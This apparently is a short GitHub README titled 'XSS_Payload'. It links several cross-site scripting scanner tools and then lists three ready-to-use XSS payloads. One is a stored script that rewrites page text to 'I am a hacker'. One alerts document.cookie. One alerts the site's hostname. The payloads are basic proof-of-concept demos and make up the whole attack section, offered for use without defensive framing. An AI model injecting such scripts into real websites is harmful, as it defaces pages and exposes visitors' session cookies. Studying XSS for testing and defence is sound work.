# XSS_Payload
perfect xss payload stored and reflected and dom and some change in the page

<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/dc249353b0a6e10635deb6d3414b5d6095886795bf022e14e049b20255207d8b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f7061796c6f6164626f782f7873732d7061796c6f61642d6c6973743f7374796c653d736f6369616c"><img src="https://camo.githubusercontent.com/dc249353b0a6e10635deb6d3414b5d6095886795bf022e14e049b20255207d8b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f7061796c6f6164626f782f7873732d7061796c6f61642d6c6973743f7374796c653d736f6369616c" data-canonical-src="https://img.shields.io/github/stars/payloadbox/xss-payload-list?style=social" style="max-width: 100%;"></a>


<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">XSS Vulnerability Scanner Tool's :</h4><a id="user-content-xss-vulnerability-scanner-tools-" class="anchor" aria-label="Permalink: XSS Vulnerability Scanner Tool's :" href="#xss-vulnerability-scanner-tools-"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>

<p dir="auto"><a href="https://github.com/UltimateHackers/XSStrike">XSStrike</a></p>

<p dir="auto"><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">BruteXSS Terminal</a></p>

<p dir="auto"><a href="https://github.com/rajeshmajumdar/BruteXSS">BruteXSS GUI</a></p>

<p dir="auto"><a href="http://xss-scanner.com/" rel="nofollow">XSS Scanner Online</a></p>

<p dir="auto"><a href="https://tools.kali.org/web-applications/xsser" rel="nofollow">XSSer</a></p>

<p dir="auto"><a href="https://github.com/DanMcInerney/xsscrapy">xsscrapy</a></p>

<p dir="auto"><a href="https://github.com/v8blink/Chromium-based-XSS-Taint-Tracking">Cyclops</a></p>


# Payloads



<code>
<script>document.body.innerHTML = document.body.innerHTML.replace("XSS Playground", "I am a hacker");</script> to change the main web page text  (STORED)
</code>

<code>
<script>alert(document.cookie);</script> to show your cookie (DOM)
</code>
<code>
<script>alert('cuurnnt url: ' + window.location.hostname)</script> (show the website ip) reflected
</code>
